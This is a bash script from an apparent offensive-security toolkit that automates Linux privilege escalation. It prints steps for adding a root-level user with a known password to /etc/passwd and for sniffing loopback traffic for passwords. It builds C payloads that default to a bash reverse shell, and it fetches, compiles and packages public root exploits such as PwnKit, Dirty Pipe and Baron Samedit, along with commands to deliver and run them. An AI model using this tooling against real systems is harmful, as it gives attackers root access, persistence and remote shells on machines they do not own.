#!/bin/bash
SCRIPTDIR=$(dirname "${BASH_SOURCE[0]}")
source $SCRIPTDIR/general.sh

linux_esclation_strategy() {
    echo 'Linux Manual Enumeration'
    echo "wget http://$http_ip:$http_port/linux_auto.sh"
    echo 'Linux Automatic Enumeration'
    echo 'unix_privesc_check standard'
    echo 'linpeas.sh'
    echo 'Look at the processes ruunning'
    echo 'watch -n 1 "ps -aux | grep pass"'
    echo 'sudo tcpdump -i lo -A | grep "pass"'
    echo "Look at cron jobs"
    grep "CRON" /var/log/syslog
    echo 'Adding password to /etc/passwd'
    echo 'openssl passwd w00t'
    echo 'echo "root2:$(openssl passwd w00t):0:0:root2:/root:/bin/bash" >> /etc/passwd'
    echo 'SUID'
    echo 'find / -perm -u=s -type f 2>/dev/null'
    echo 'Linux Capabilities'
    echo '/usr/sbin/getcap -r / 2>/dev/null'
    echo 'check GTFOBins for Linux'
    echo 'https://gtfobins.github.io/'
    echo 'check logs for unexpected blocks'
    echo 'cat /var/log/syslog | grep "[exploited process]"'
    echo 'Try other commands if they seem to be blocked'
    echo 'Search for kernel exploits'
    echo 'uname -r'
    echo 'arch'
    echo 'searchsploit linux kernel $(uname -r)'
}

create_linux_exploits_generic() {
    if [[ -z "$exploit_dir" ]]; then
        exploit_dir="exploit"
    fi
    if [[ -z $linux_c_file_name ]]; then
        echo "linux_c_file_name is not set"
        return 1
    fi
    if [[ -z $compile_command ]]; then
        echo "compile_command is not set"
        return 1
    fi
    if [[ ! -d $exploit_dir ]]; then
        mkdir "$exploit_dir"
    fi
    pushd "$exploit_dir" || exit 1
    cp "$SCRIPTDIR/../c/$linux_c_file_name" .
    if [[ -z $cmd ]]; then
        cmd=$(get_bash_reverse_shell)
        echo "cmd is not set, using default: $cmd"
    fi
    local command=$(echo "$cmd" | sed 's/"/\\"/g')
    command=$(escape_sed "$command")
    sed -E -i 's/\{command\}/'"$command"'/g' $linux_c_file_name
    echo "all:" > Makefile
    echo -e "\t$compile_command" >> Makefile
    #most production systems do not come with make
    echo "$compile_command" > make.sh
    chmod a+x make.sh   
    if [[ ! -z $compile_exploit ]] && [[ $compile_exploit == "true" ]]; then
        compile_cpp
    fi
    popd || exit 1
    local exploit_filename=$(get_compression_filename "$exploit_dir")
    if [[ -f $exploit_filename ]]; then
        rm "$exploit_filename"
    fi
    compress_file "$exploit_filename" "$exploit_dir"
    generate_download_linux "$exploit_filename"
    get_uncompress_command "$exploit_filename"
    echo "cd $exploit_dir"
    echo "make"    
}


create_linux_executable() {
    echo "Creating Linux executable..."
    exploit_dir="exploit_executable"
    linux_c_file_name="run_linux.c"
    compile_command="gcc -o run_linux $linux_c_file_name"
    create_linux_exploits_generic
}

create_linux_shared_library() {
    echo "Creating Linux shared library..."
    exploit_dir="exploit_shared"
    linux_c_file_name="run_linux_so.c"
    compile_command="gcc -shared -fPIC -o librun_linux.so $linux_c_file_name"
    create_linux_exploits_generic
}


compile_cpp() {
    if [[ -z "$target_os" ]]; then
        target_os="ubuntu:20.04"
        echo "target_os is not set, going to use the default $target_os"
    fi
    if [[ $target_os == "debian:9.0" ]]; then
        echo "# Main repositories
deb [trusted=yes] http://archive.debian.org/debian/ stretch main contrib non-free
# Security updates
deb [trusted=yes] http://archive.debian.org/debian-security/ stretch/updates main contrib non-free" > updates_sources.list
        preupdate_action="echo \"$(cat updates_sources.list)\" > /etc/apt/sources.list &&"
    fi
    if [[ -z "$make_command" ]]; then
        make_command="make"
    fi
    if [[ ! -z "$extra_packages" ]]; then
        echo "Adding extra packages to the apt installation, $extra_packages"
    fi
    if [[ ! -z "$preupdate_action" ]]; then
        echo "Running preupdate_action: $preupdate_action"
    fi
    docker run -v "$(pwd):/opt/exploit" -w "/opt/exploit" --rm "$target_os" /bin/bash -c "$preupdate_action apt update && DEBIAN_FRONTEND=noninteractive apt install -y gcc binutils make $extra_packages && $make_command"

}


perform_cve_2017_16995() {
    local target_os=$1
    if [ -z "$target_os" ]; then
        target_os="ubuntu:16.04"
    fi
    local cve_dir="CVE-2017-16995"
    local cve_filename="cve_2017_16995"
    cve_filename=$(get_compression_filename "$cve_filename")
    if [ ! -d "$cve_dir" ]; then
        mkdir "$cve_dir"
    fi
    pushd $cve_dir || exit 1
    if [ ! -f "45010.c" ]; then
        wget "https://www.exploit-db.com/download/45010" -O 45010.c
    fi
    local exploit_executable="45010"
    if [ ! -f "$exploit_executable" ]; then
        echo "$exploit_executable binary not found, compiling..."
        echo "all:" > Makefile
        echo -e "\tgcc -o $exploit_executable 45010.c" >> Makefile
        compile_cpp
    else
        echo "$exploit_executable binary already exists, skipping compilation. Remove it first if you want to recompile."
    fi
    popd || exit 1
    if [[ -f $cve_filename ]]; then
        rm "$cve_filename"
    fi
    compress_file "$cve_filename" "$cve_dir"
    download_linux_file "$cve_filename"
}


get_compression_filename(){

    local cve_filename=""
    if [[ -z "$1" ]]; then
        echo "filename required"
        return 1
    else
        cve_filename="$1"
    fi
    if [[ -z $compression_type ]]; then
        compression_type="tar"
    fi  
    if [[ $compression_type == "zip" ]]; then
        cve_filename="$cve_filename.zip"
    else
        cve_filename="$cve_filename.tar.gz"
    fi
    echo "$cve_filename"
}

compress_file() {
    local cve_filename="$1"
    local cve_dir="$2"
    if [[ -z $cve_filename ]]; then
        echo "cve_filename required"
        return 1
    fi
    if [[ -z "$cve_dir" ]]; then
        echo "cve_dir required"
        return 1
    fi
    if [[ -z $compression_type ]]; then
        compression_type="tar"
    fi
    if [[ $compression_type == "zip" ]]; then
        zip -r "$cve_filename" "$cve_dir"
    else
        tar -czvf "$cve_filename" "$cve_dir"
    fi
}

get_uncompress_command() {
    if [[ -z "$1" ]]; then
        echo "cve_filename required"
        return 1
    fi
    local cve_filename="$1"
    if [[ -z $compression_type ]]; then
        compression_type="tar"
    fi    
    if [[ $compression_type == "zip" ]]; then
        echo "unzip $cve_filename"
    else
        echo "tar -xzvf $cve_filename"

    fi
}

#=================
#pwnkit
#=================

perform_cve_2021_4034() {

    local cve_filename="cve_2021_4034"
    cve_filename=$(get_compression_filename "$cve_filename")
    local cve_dir="CVE-2021-4034"
    if [ ! -d "$cve_dir" ]; then
        mkdir "$cve_dir"
    fi
    pushd "$cve_dir" || exit 1
    if [ ! -f 50689.txt ]; then
        searchsploit -m 50689
    fi
    if [ ! -f Makefile ]; then
        echo "Makefile not found, extracting from 50689.txt..."
        awk '
            /^[#]+ Makefile/ {
                while ((getline) > 0 && !/^[#]+$/) {
                    print
                }
                next
            }
        ' 50689.txt > Makefile
    fi

    if [ ! -f evil-so.c ]; then
        echo "evil-so.c not found, extracting from 50689.txt..."
        awk '
            /^[#]+ evil-so.c/ {
                while ((getline) > 0 && !/^[#]+$/) {
                    print
                }
                next
            }
        ' 50689.txt > evil-so.c
    fi
    if [ ! -f exploit.c ]; then
        echo "exploit.c not found, extracting from 50689.txt..."
        awk '
            /^[#]+ exploit.c/ {
                while ((getline) > 0 && !/^[#]+$/) {
                    print
                }
                next
            }
        ' 50689.txt > exploit.c
    fi
    if [[ ! -z "$compile_exploit" ]]; then
        if [ ! -f exploit ]; then
            echo "Compiling exploit..."
            compile_cpp
        else
            echo "Exploit already compiled, skipping compilation."
        fi
    fi
    popd || exit 1
    if [[ -f "$cve_filename" ]]; then
        echo "Removing existing $cve_filename"
        rm $cve_filename
    fi
    compress_file "$cve_filename" "$cve_dir"
    generate_download_linux $cve_filename
    get_uncompress_command "$cve_filename"

}

perform_cve_2021_3560() {
    #local url="https://raw.githubusercontent.com/f4T1H21/CVE-2021-3560-Polkit-DBus/refs/heads/main/poc.sh"
    #wget "$url" -O cve_2021_3560.sh
    echo 'Check for the following'
    echo 'apt list --installed | grep gnome-control-center'
    echo 'apt list --installed | grep accountsservice'
    if [[ ! -f "50011.sh" ]]; then
        searchsploit -m 50011
    fi
    cp 50011.sh cve_2021_3560.sh
    generate_linux_download "cve_2021_3560.sh"
}

#=============
#sudo baron
#=============

perform_cve_2021_3156() {
    local download_url="https://codeload.github.com/blasty/CVE-2021-3156/zip/main"
    local cve_dir="CVE-2021-3156"
    local cve_filename="cve_2021_3156"
    cve_filename=$(get_compression_filename "$cve_filename")
    if [[ ! -d "$cve_dir" ]]; then
        wget "$download_url" -O "$cve_dir.zip"
        unzip "$cve_dir.zip"
        mv "CVE-2021-3156-main" "$cve_dir"
    fi
    pushd "$cve_dir" || exit 1
    if [[ ! -z "$compile_exploit" ]] && [[ $compile_exploit == "true" ]]; then
        echo "Compiling exploit..."
        local exploit_executable="sudo-hax-me-a-sandwich"
        if [[ ! -f "$exploit_executable" ]]; then
            compile_cpp
        fi
        popd || exit 1
    fi
    if [[ -f "$cve_filename" ]]; then
        rm "$cve_filename"
    fi
    compress_file "$cve_filename" "$cve_dir"
    generate_linux_download "$cve_filename"
    get_uncompress_command "$cve_filename"
    echo "cd $cve_dir"
    echo 'make'
    echo "./$exploit_executable"
}


perform_cve_2021_22555() {
    local download="https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2021-22555/exploit.c"
    local cve_filename=$(get_compression_filename "cve_2021_22555")
    local cve_dir="CVE-2021-22555"
    if [ ! -d "$cve_dir" ]; then
        mkdir "$cve_dir"
    fi
    pushd "$cve_dir" || exit 1
    if [[ ! -f "exploit.c" ]]; then
        wget "$download" -O "exploit.c"
    fi
    if [[ ! -z "$compile_exploit" ]]; then
        local exploit_executable="exploit"
        if [[ ! -f "$exploit_executable" ]]; then
            echo "Compiling exploit..."
            echo "all:" > Makefile
            echo -e "\tgcc -m32 -static -o $exploit_executable -Wall exploit.c" >> Makefile
            extra_packages="gcc-multilib"
            compile_cpp
        else
            echo "Exploit already compiled, skipping compilation."
        fi
    fi
    popd || exit 1
    rm $cve_filename
    compress_file "$cve_filename" "$cve_dir"
    generate_download_linux $cve_filename
    get_uncompress_command "$cve_filename"

}

# nft object UAF
# specific to ubuntu 22.04 or somewhat newer versions
# older versions will not compile because it does not have NFT_EXPR

perform_cve_2022_32250() {
    local download_url="https://raw.githubusercontent.com/theori-io/CVE-2022-32250-exploit/main/exp.c"
    local cve_filename=$(get_compression_filename "cve_2022_32250")
    local cve_dir="CVE-2022-32250"
    echo 'Ensure you check the following packages are installed:'
    echo 'apt list --installed | grep libmnl'
    echo 'apt list --installed | grep libnftnl'
    echo 'sysctl kernel.unprivileged_userns_clone'

    if [ ! -d "$cve_dir" ]; then
        mkdir "$cve_dir"
    fi
    pushd "$cve_dir" || exit 1
    if [[ ! -f "exp.c" ]]; then
        wget "$download_url" -O "exp.c"
    fi
    if [[ ! -z "$compile_exploit" ]] && [[ "$compile_exploit" == "true" ]]; then
        local exploit_executable="exp"
        if [ ! -f "$exploit_executable" ]; then
            echo "Compiling exploit..."
            echo "all:" > Makefile
            echo -e "\tgcc -o exp exp.c -lmnl -lnftnl -w -Wno-error=implicit-function-declaration" >> Makefile
            extra_packages="libmnl-dev libnftnl-dev"
            target_os="ubuntu:22.04"
            compile_cpp
            echo "Exploit already compiled, skipping compilation."
        fi
    fi
    popd || exit 1
    if [[ -f "$cve_filename" ]]; then
        echo "Removing existing $cve_filename"
        rm $cve_filename
    fi
    compress_file "$cve_filename" "$cve_dir"
    generate_linux_download "$cve_filename"
    get_uncompress_command "$cve_filename"
    echo "cd $cve_dir"
    echo "make"
    echo "./exp"
}

# specific to ubuntu 22.04 or somewhat newer versions
# https://ubuntu.com/security/CVE-2022-2586
# confirm libmnl and libnftnl are installed

perform_cve_2022_2586() {
    local download_url="https://www.openwall.com/lists/oss-security/2022/08/29/5/1"
    local cve_filename=$(get_compression_filename "cve_2022_2586")
    local cve_dir="CVE-2022-2586"
    echo 'Ensure you check the following packages are installed:'
    echo 'apt list --installed | grep libmnl'
    echo 'apt list --installed | grep libnftnl'
    echo 'sysctl kernel.unprivileged_userns_clone'

    if [ ! -d "$cve_dir" ]; then
        mkdir "$cve_dir"
    fi
    pushd "$cve_dir" || exit 1
    if [[ ! -f "exploit.c" ]]; then
        wget "$download_url" -O "exploit.c"
    fi
    if [[ ! -z "$compile_exploit" ]]; then
        local exploit_executable="exploit"
        if [[ ! -f "$exploit_executable" ]]; then
            echo "Compiling exploit..."
            echo "all:" > Makefile
            echo -e "\tgcc exploit.c -lmnl -lnftnl -no-pie -lpthread -w -o $exploit_executable" >> Makefile
            extra_packages="libmnl-dev libnftnl-dev"
            target_os="ubuntu:22.04"
            compile_cpp
        else
            echo "Exploit already compiled, skipping compilation."
        fi
    fi
    popd || exit 1
    if [[ -f "$cve_filename" ]]; then
        echo "Removing existing $cve_filename"
        rm "$cve_filename"
    fi
    compress_file "$cve_filename" "$cve_dir"
    generate_linux_download "$cve_filename"
    get_uncompress_command "$cve_filename"
    echo "cd $cve_dir"
    echo "make"
    echo "./exploit"
}

#=========================
# Dirty pipe
# https://dirtypipe.cm4all.com/
#=========================

perform_cve_2022_0847() {
    local download_url="https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits/archive/refs/heads/main.zip"
    local cve_dir="CVE-2022-0847"
    cve_filename=cve_2022_0847
    local cve_filename=$(get_compression_filename "$cve_filename")

    if [[ ! -d "$cve_dir" ]]; then
        wget "$download_url" -O "$cve_dir.zip"
        unzip "$cve_dir.zip"
        rm "$cve_dir.zip"
        mv "CVE-2022-0847-DirtyPipe-Exploits-main" "$cve_dir"
    fi

    pushd "$cve_dir" || exit 1
    if [[ ! -z "$compile_exploit" ]]; then
        if [[ ! -f "exploit-1" ]] || [[ ! -f "exploit-2" ]]; then
            echo "Compiling exploit..."
            make_command="chmod a+x compile.sh; ./compile.sh"
            compile_cpp
        else
            echo "Exploit already compiled, skipping compilation."
        fi
    fi
    popd || exit 1
    if [[ -f "$cve_filename" ]]; then
        echo "Removing existing $cve_filename"
        rm "$cve_filename"
    fi
    compress_file "$cve_filename" "$cve_dir"
    generate_linux_download "$cve_filename"
    get_uncompress_command "$cve_filename"
    echo "cd $cve_dir"
    echo "chmod a+x compile.sh"
    echo "./compile.sh"
    echo "./exploit-1"
    echo "./exploit-2"  
}


# 20.04 make_command="make groovy"
# 21.04 make_command="make hirsute"
#
perform_cve_2021_3490() {
    local download_url="https://codeload.github.com/chompie1337/Linux_LPE_eBPF_CVE-2021-3490/zip/main"
    local cve_dir="CVE-2021-3490"
    local cve_filename=$(get_compression_filename "cve_2021_3490")
    if [[ ! -d "$cve_dir" ]]; then
        wget "$download_url" -O "$cve_dir.zip"
        unzip -n "$cve_dir.zip"
        rm "$cve_dir.zip"
        mv "Linux_LPE_eBPF_CVE-2021-3490-main" "$cve_dir"
    fi
    pushd "$cve_dir" || exit 1
    if [[ ! -z "$compile_exploit" ]]; then
        local exploit_executable="exploit"
        if [[ ! -f "$exploit_executable" ]]; then
            echo "Compiling exploit..."
            compile_cpp
        else
            echo "Exploit already compiled, skipping compilation."
        fi
    fi
    popd || exit 1
    if [[ -f "$cve_filename" ]]; then
        echo "Removing existing $cve_filename"
        rm "$cve_filename"
    fi
    compress_file "$cve_filename" "$cve_dir"
    generate_linux_download "$cve_filename"
    get_uncompress_command "$cve_filename"
    echo "cd $cve_dir"
    echo "make"
    echo "./exploit"
}

# specific to ubuntu 18.04
# https://www.exploit-db.com/exploits/45886
# note that you will need to modify the source code

perform_cve_2018_18955() {
    local download_url="https://gitlab.com/exploit-database/exploitdb-bin-sploits/-/raw/main/bin-sploits/45886.zip"
    local cve_dir="CVE-2018-18955"
    if [[ ! -d "$cve_dir" ]]; then
        wget "$download_url" -O "$cve_dir.zip"
        unzip -n "$cve_dir.zip"
        rm "$cve_dir.zip"
        mv "CVE-2018-18955-main" "$cve_dir"
    fi
    pushd "$cve_dir/45886" || exit 1
    if [[ ! -z "$compile_exploit" ]]; then
        local exploit_executable="subuid_shell"
        if [[ ! -f "$exploit_executable" ]]; then
            echo "Compiling exploit..."
            echo "all: subuid_shell subshell" > Makefile
            echo "subuid_shell:" >> Makefile
            echo -e "\tgcc -o subuid_shell subuid_shell.c" >> Makefile
            echo "subshell:" >> Makefile
            echo -e "\tgcc -o subshell subshell.c" >> Makefile
            target_os="ubuntu:18.04"
            compile_cpp
        else
            echo "Exploit already compiled, skipping compilation."
        fi
    fi
    popd || exit 1
    local cve_filename=$(get_compression_filename "cve_2018_18955")
    if [[ -f "$cve_filename" ]]; then
        echo "Removing existing $cve_filename"
        rm $cve_filename
    fi
    compress_file "$cve_filename" "CVE-2018-18955"
    generate_linux_download "$cve_filename"
    get_uncompress_command "$cve_filename"
    echo "cd CVE-2018-18955/45886"
    echo "make"
    echo "./subuid_shell"
    echo "./subshell"
}

perform_cve_2019_13272() {
    local download_url="https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2019-13272/poc.c"
    local cve_dir="CVE-2019-13272"
    if [[ -z $target_os ]]; then
        target_os="debian:9.0"
    fi
    if [[ ! -d "$cve_dir" ]]; then
        mkdir "$cve_dir"
        wget "$download_url" -O "$cve_dir/poc.c"
    fi
    pushd "$cve_dir" || exit 1
    if [[ ! -z "$compile_exploit" ]] && [[ $compile_exploit == "true" ]]; then
        local exploit_executable="exploit"
        echo "all:" > Makefile
        echo -e "\tgcc -o $exploit_executable poc.c" >> Makefile
        if [[ ! -f "$exploit_executable" ]]; then
            echo "Compiling exploit..."
            compile_cpp
        else
            echo "Exploit already compiled, skipping compilation."
        fi
    fi
    popd || exit 1
    local cve_filename=$(get_compression_filename "cve_2019_13272")
    if [[ -f "$cve_filename" ]]; then
        echo "Removing existing $cve_filename"
        rm $cve_filename
    fi
    compress_file "$cve_filename" "$cve_dir"
    generate_linux_download "$cve_filename"
    get_uncompress_command "$cve_filename"
    echo "cd $cve_dir"
    echo "make"
    echo "./$exploit_executable"

}